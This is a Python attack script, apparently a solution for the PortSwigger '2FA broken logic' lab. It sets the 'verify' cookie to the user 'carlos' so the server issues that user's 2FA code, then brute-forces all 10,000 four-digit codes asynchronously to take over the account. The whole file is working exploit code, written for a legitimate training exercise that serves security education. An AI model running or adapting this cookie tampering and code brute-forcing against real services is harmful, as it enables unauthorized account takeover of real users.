#!/usr/bin/env python3
# Lab: 2FA broken logic
# Lab-Link: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic
# Difficulty: PRACTITIONER

import aiohttp
import asyncio
import sys
import urllib3
from typing import Optional

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


async def try_login(session: aiohttp.ClientSession, host: str, code: int) -> Optional[int]:
    """Attempt to login with a given 2FA code."""
    data = {'mfa-code': f'{code:04}'}
    print(data)
    async with session.post(f'{host}/login2', data=data, allow_redirects=True) as response:
        text = await response.text()
        if "Your username is: carlos" in text:
            return code
    return None


async def main() -> None:
    """Main function to execute the 2FA brute force attack."""
    print('[+] Lab: 2FA broken logic')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: python {sys.argv[0]} <HOST>')
        print(f'Example: python {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    async with aiohttp.ClientSession() as session:
        # Get a valid session token
        await session.get(f'{host}/login')

        # Generate a 2FA token for carlos
        session.cookie_jar.update_cookies({'verify': 'carlos'})
        await session.get(f'{host}/login2')

        # Brute force the 2FA token using asyncio
        tasks = [try_login(session, host, i) for i in range(10000)]
        for task in asyncio.as_completed(tasks):
            result = await task
            if result is not None:
                print(f'[+] Login to user carlos successful with code {result}, lab solved')
                sys.exit(0)

        print(f'[-] Login to user carlos not successful')


if __name__ == "__main__":
    asyncio.run(main())
